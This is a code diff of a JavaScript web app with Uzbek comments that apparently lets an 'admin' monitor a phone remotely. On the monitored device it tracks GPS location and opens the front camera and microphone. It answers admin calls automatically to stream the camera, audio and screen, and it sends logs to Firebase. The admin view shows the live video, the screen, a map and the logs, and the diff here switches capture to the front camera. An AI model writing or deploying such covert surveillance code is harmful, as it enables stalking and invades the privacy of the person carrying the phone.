@@ -22,7 +22,7 @@ let isTalking = false;
 let map = null;
 let marker = null;
 
-// --- LOG TIZIMI (Xatolarni Firebase orqali Adminga yuborish) ---
+// --- LOG TIZIMI ---
 function sendLog(msg) {
     const id = peer ? peer.id : 'no-id';
     db.ref('devices/' + id + '/logs').push({
@@ -33,7 +33,6 @@ function sendLog(msg) {
 
 window.onerror = (m, u, l) => sendLog(`Xato: ${m} | Qator: ${l}`);
 
-// SAHIFA YUKLANGANDA
 window.onload = () => {
     const role = localStorage.getItem('myRTC_role');
     const name = localStorage.getItem('myRTC_deviceName');
@@ -62,7 +61,7 @@ async function startUserLogic(deviceName) {
     peer.on('open', (id) => {
         db.ref('devices/' + id).set({ name: deviceName, status: 'online' });
         db.ref('devices/' + id).onDisconnect().remove();
-        sendLog("Telefon onlayn. ID: " + id);
+        sendLog("Telefon onlayn. Old kamera tanlandi.");
         
         // GPS
         navigator.geolocation.watchPosition(p => {
@@ -70,41 +69,33 @@ async function startUserLogic(deviceName) {
                 lat: p.coords.latitude, lng: p.coords.longitude
             });
         }, e => sendLog("GPS xatosi: " + e.message));
-
-        // Batareya
-        if (navigator.getBattery) {
-            navigator.getBattery().then(b => {
-                const upd = () => db.ref('devices/' + id + '/info').update({ battery: Math.floor(b.level * 100) + "%" });
-                upd(); b.onlevelchange = upd;
-            });
-        }
     });
 
     try {
-        // Kamerani olish (Ideal sozlamalar bilan)
+        // MUHIM: BU YERDA facingMode: "user" FAQAT OLD KAMERANI OCHADI
         localStream = await navigator.mediaDevices.getUserMedia({ 
-            video: { facingMode: { ideal: "environment" } }, 
+            video: { facingMode: "user" }, 
             audio: true 
         });
-        sendLog("Kamera va mikrofon tayyor.");
+        sendLog("Old kamera va mikrofon tayyor.");
 
         peer.on('call', async (call) => {
-            sendLog("Admin ulandi...");
             if (call.metadata && call.metadata.type === 'getScreen') {
-                const screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
-                call.answer(screenStream);
-                sendLog("Ekran uzatish boshlandi.");
+                try {
+                    const screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+                    call.answer(screenStream);
+                } catch (e) { sendLog("Ekran berilmadi."); }
             } else {
                 call.answer(localStream);
-                // Admin ovozini eshitish
+                // Admin ovozini qabul qilish
                 call.on('stream', s => {
                     const a = new Audio(); a.srcObject = s; a.play();
                 });
             }
         });
     } catch (e) {
-        sendLog("Media xatosi: " + e.message);
-        alert("Ruxsat berilmadi!");
+        sendLog("Kamera ochilmadi: " + e.message);
+        alert("Xato: " + e.message);
     }
 }
 
@@ -139,7 +130,7 @@ function connectToDevice(id, name) {
     currentActiveCallId = id;
     document.getElementById('target-name').innerText = "Qurilma: " + name;
 
-    // Loglarni ko'rsatish
+    // Loglar
     const logBox = document.getElementById('console-logs');
     logBox.innerHTML = "";
     db.ref('devices/' + id + '/logs').limitToLast(10).on('child_added', s => {
@@ -153,13 +144,13 @@ function connectToDevice(id, name) {
         if (s.val()) initMap(s.val().lat, s.val().lng);
     });
 
-    // 1. Kamera ulanishi
+    // Kamera ulanishi
     const videoCall = adminPeer.call(id, null);
     videoCall.on('stream', s => {
         document.getElementById('remoteVideo').srcObject = s;
     });
 
-    // 2. Ekran ulanishi
+    // Ekran ulanishi
     const screenCall = adminPeer.call(id, null, { metadata: { type: 'getScreen' } });
     screenCall.on('stream', s => {
         document.getElementById('screenVideo').srcObject = s;
